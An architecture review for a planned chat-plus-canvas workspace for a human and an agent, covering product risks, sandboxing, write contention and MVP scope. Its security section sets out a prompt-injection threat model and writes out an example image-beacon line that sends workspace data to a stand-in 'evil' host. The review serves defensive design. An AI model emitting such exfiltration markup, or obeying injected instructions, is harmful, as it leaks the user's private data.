# Fable pre-research review: Hermes Canvas

Adversarial architecture review of `docs/brief.md`, written **before** market research and **before** any implementation. Purpose: name the traps now so the research phase collects evidence against them instead of confirming the pitch.

Scope of the idea under test: a public-hosted, authenticated workspace — resizable chat pane on the left, agent-editable multi-tab canvas (HTML containers, Markdown, diagrams, Kanban-style boards) on the right, for one human working with one Hermes agent.

---

## 1. Likely product traps

**T1. "Chat + canvas" is a UI shape, not a product.** The stated value is "make agent work legible and auditable." Legibility is a *property* incumbents ship for free (Claude Artifacts, ChatGPT Canvas, agent IDE panes). If Hermes Canvas is only the shape, it competes with the default surface of every frontier-lab product. The defensible core, if any, is the **audit trail** (who changed what, when, why) — the brief mentions it once and specifies nothing for it.

**T2. Four renderers = four products.** HTML containers, Markdown, diagrams, and Kanban boards each have their own editing model, failure modes, and persistence. Committing to all four in v1 is scope quicksand. Each renderer added before the audit/versioning core exists is negative progress.

**T3. Collaboration theater.** "Human and Hermes agent" is one human. Reaching for multiplayer machinery (CRDTs, presence, cursors) to serve a single-user tool is the classic over-build. The actual hard problem is narrower and different: **human-vs-agent write contention** on the same artifact (see §3).

**T4. Agent-editable UI has an unbounded output space.** The agent will emit broken HTML, invalid diagram syntax, and layouts that thrash. If the canvas has no schema/contract for what the agent may write, "clear current state" degrades into "whatever the last generation produced." The artifact contract (allowed types, size limits, validation, error rendering) is the real design surface, not the panes.

**T5. "Simple and inexpensive" conflicts with the other requirements.** Public hosting + auth + file uploads + live agent updates (some push channel) + sandboxed arbitrary HTML is not the cheap tier of anything. Either the hosting constraint bends or the feature list does. Decide which before stack selection, not after.

**T6. Audit claim without versioning is a whiteboard.** If the agent overwrites an artifact in place and the human can't see a diff or restore a prior version, the auditability claim is false in the first week of use. Append-only history is not a nice-to-have here; it's the product thesis.

**T7. "Possible future product" is doing a lot of quiet work.** Personal-tool decisions (single-tenant auth, no billing, no isolation between users) and product decisions (multi-tenant, sharing, permissions) diverge immediately. Build explicitly for one user now and write down what a product pivot would invalidate — don't split the difference.

## 2. Security / privacy boundaries

**S1. Agent-generated HTML rendered inside an authenticated app is XSS by design.** This is the single biggest technical boundary. Rendered agent HTML must never execute in the app's origin with the user's session. Non-negotiable baseline: sandboxed iframes on a **separate origin** (or `sandbox` attr without `allow-same-origin`), strict CSP, no access to auth cookies/tokens. This is exactly how Claude Artifacts and similar surfaces do it — research should confirm the specific patterns.

**S2. Prompt injection → exfiltration through the canvas.** Uploaded files/images and any web content the agent reads can carry instructions. An injected agent that can write HTML can exfiltrate chat/workspace contents via `<img src="https://evil/...?data=">`-style beacons or fetches from the rendered container. Mitigations to design in: block network egress from rendered artifacts (CSP `default-src 'none'` posture, allowlisted assets only), and treat all attachments as untrusted agent input.

**S3. Public-hosted auth surface.** Who can create an account? For a personal tool, the honest answer is "nobody — one owner." Prefer closed signup or a zero-user-management gate (e.g., an access proxy / OAuth allowlist of one) over rolling password auth. Publicly reachable + agent-connected + real credentials is an attractive target for effectively zero users.

**S4. Attachments.** Size limits, content-type validation, serving uploads from a non-app origin with `Content-Disposition`/no-sniff so an uploaded HTML file can't become a stored-XSS vector. Private storage — a public bucket of "auditable agent work" is a data leak.

**S5. The agent's blast radius.** What can Hermes reach *besides* the canvas — repos, email, other tools? The workspace is also the place where a confused or injected agent's actions become visible, which means canvas writes should be attributable and rate-limited, and destructive operations (delete artifact/tab) should be soft-delete.

**S6. The audit log is itself sensitive.** Chat history + artifacts = a full record of work, possibly including secrets pasted into chat. Retention, export, and delete need an answer even for one user.

## 3. Collaboration / canvas failure modes

**F1. Human–agent write contention.** Human edits a Kanban card while the agent rewrites the board → last-write-wins silently destroys one side. You don't need CRDTs for 1 human + 1 agent, but you do need an explicit policy: per-artifact locking, agent-proposes/human-accepts, or field-level merge. Pick one; "we'll deal with it" is how the audit thesis dies.

**F2. Silent staleness.** Human is looking at tab 3; agent updates tab 1. Without unread/changed indicators per tab and per artifact, "clear current state" fails exactly when the agent is most active. Legibility is a notification-and-diff problem as much as a rendering problem.

**F3. Overwrite without diff.** Agent regenerates an artifact wholesale (LLMs prefer regeneration to patching). Human sees the new version and has no idea what changed. Every agent write should land as a diffable revision.

**F4. Artifact sprawl.** Tabs and artifacts accumulate with no lifecycle. Within weeks the canvas is a junk drawer and legibility inverts. Need archive/pin/stale conventions, even crude ones.

**F5. Rendering failures must be legible too.** Invalid Mermaid, malformed HTML, oversized payloads — the failure state should show the error *and the raw source*, never a blank container. A canvas that silently drops broken artifacts hides exactly the agent mistakes the tool exists to expose.

**F6. Transport and reconnection.** Live updates imply a push channel (WebSocket/SSE). Dropped connections mid-update → half-applied state. Canvas state must be reconstructable from the server on reconnect (server is source of truth; the socket is only an invalidation hint).

**F7. Layout state.** Resizable pane and tab arrangement should persist per device/session; minor, but it's the kind of paper cut that makes a daily tool feel broken.

## 4. MVP vs. explicitly deferred

**MVP (earns the thesis):**
- Single-owner auth, closed signup. No user management UI.
- Chat pane with text + basic image/file attachment (hard size limits, private storage).
- Canvas with tabs; artifact types limited to **Markdown + one diagram type (e.g., Mermaid)**.
- **Append-only artifact versioning with visible diffs** — the audit core; ship before any additional renderer.
- Per-tab / per-artifact "changed since you last looked" indicators.
- Server-authoritative state with a live-update channel and clean reconnect.
- Visible error states for failed renders.

**In MVP only if cheap, otherwise first follow-up:** sandboxed static-HTML containers (separate origin, no egress, no interactivity with the host app).

**Explicitly deferred:**
- Interactive HTML apps in containers (postMessage bridges, agent↔widget state sync).
- Kanban/status boards as a first-class structured type (start as Markdown; promote only if usage proves it).
- Multi-user anything: sharing, permissions, presence, real-time co-editing, CRDTs.
- Artifact linking/graph beyond plain hyperlinks between artifacts.
- Mobile layout, offline, export/import, notifications, billing/tenancy.
- Agent tool integrations beyond chat + canvas writes.

## 5. Evidence the research phase must collect

1. **Sandboxing patterns, verbatim.** How Claude Artifacts, ChatGPT Canvas, and tldraw-style "render agent HTML" tools isolate content (origins, CSP, egress policy). Collect actual headers/architectures, not blog summaries.
2. **Documented prompt-injection/exfiltration incidents** in agent surfaces that render markup (there are published write-ups) — use them to validate the S2 threat model.
3. **Do artifacts actually get read?** Usage signals, reviews, and complaints for agent workspaces (Devin, OpenHands, Replit Agent, Claude/ChatGPT canvases): do users inspect intermediate artifacts, or do canvases rot? This tests the core legibility thesis.
4. **How incumbents show agent changes:** diff/revision UX in ChatGPT Canvas, Cursor/Copilot Edits review flows, Notion AI. What do users praise or curse?
5. **Write-contention approaches** in human+agent tools: locking vs. propose/accept vs. free-for-all, and reported failure stories. Confirm or refute "CRDTs unnecessary at 1+1."
6. **Real cost floor** for the required shape (auth + WebSocket/SSE + object storage + DB) on candidate platforms (Cloudflare Workers/DO, Fly, Vercel, VPS) at ~1-user scale — numbers, not tiers.
7. **Auth-for-one patterns:** Cloudflare Access / OAuth-allowlist / passkey single-tenant setups — effort and cost vs. rolling app auth.
8. **Artifact-type usage distribution:** which types (code, docs, diagrams, boards) get used vs. ignored in comparable tools — directly informs which renderers to defer.
9. **Failure-mode reports** for collaborative canvases (Miro/Figma/Excalidraw reviews): sprawl, staleness, performance cliffs with many objects.

## 6. Competing / adjacent categories to investigate

| Category | Examples | Why it matters |
|---|---|---|
| AI chat + artifact surfaces | Claude Artifacts, ChatGPT Canvas, Gemini Canvas | The direct incumbents; steal sandboxing + diff UX, find what they can't do (persistence, multi-tab, audit) |
| Agent workspaces / IDEs | Devin, OpenHands, Replit Agent, Cursor, Copilot Workspace | How agent activity is made legible (plans, terminals, diffs); where users report losing track of the agent |
| Collaborative canvases | Figma/FigJam, Miro, tldraw ("Make Real"), Excalidraw | Canvas interaction patterns and sprawl/staleness failure modes |
| AI docs/wikis | Notion AI, Coda | Structured artifacts + AI edits inside persistent docs; block-level versioning |
| Project dashboards | Linear, Trello, GitHub Projects | What a "status board" must do before a Markdown table stops sufficing |
| Notebook/literate surfaces | Jupyter, Observable, Marimo | Mixed prose/code/output documents; the original "legible computational work" pattern |
| Agent trace/observability tools | LangSmith, AgentOps, Claude Code transcripts | The other approach to "auditable agent work" — traces instead of artifacts; why a canvas beats (or loses to) a trace viewer |
| Sync/collab infrastructure | Yjs, Liveblocks, PartyKit, Durable Objects | Patterns and cost reference for the live-update channel — infrastructure candidates, not competitors |

---

**Bottom line:** the risky bet is not the layout — panes and tabs are commodity. The bets that need evidence are (1) people actually read agent artifacts when they're persistent and diffable, (2) agent HTML can be rendered safely and cheaply, and (3) versioned-artifact auditability is meaningfully better than the trace viewers and canvases that already exist. Research should target those three claims first; everything in §5 maps onto them.
